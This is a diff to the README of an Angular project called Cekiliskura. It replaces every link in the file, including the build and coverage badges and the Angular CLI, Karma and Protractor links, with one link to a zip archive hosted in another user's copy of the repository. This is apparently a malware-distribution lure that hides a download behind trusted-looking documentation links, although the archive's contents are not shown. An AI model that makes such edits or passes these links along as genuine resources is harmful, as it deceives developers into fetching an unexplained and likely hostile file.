@@ -1,10 +1,10 @@
 # Cekiliskura
 
-[![Build Status](https://travis-ci.org/coderkan/cekiliskura.svg?branch=master)](https://travis-ci.org/coderkan/cekiliskura)
-[![codecov](https://codecov.io/gh/coderkan/cekiliskura/branch/master/graph/badge.svg)](https://codecov.io/gh/coderkan/cekiliskura)
+[![Build Status](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip)](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip)
+[![codecov](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip)](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip)
 
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 7.1.4.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip) version 7.1.4.
 
 ## Development server
 
@@ -20,12 +20,12 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://karma-runner.github.io).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip).
 
 ## Running end-to-end tests
 
-Run `ng e2e` to execute the end-to-end tests via [Protractor](http://www.protractortest.org/).
+Run `ng e2e` to execute the end-to-end tests via [Protractor](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip).
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI README](https://github.com/angular/angular-cli/blob/master/README.md).
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI README](https://raw.githubusercontent.com/Oguzhan132/cekiliskura/master/antifanatic/cekiliskura.zip).
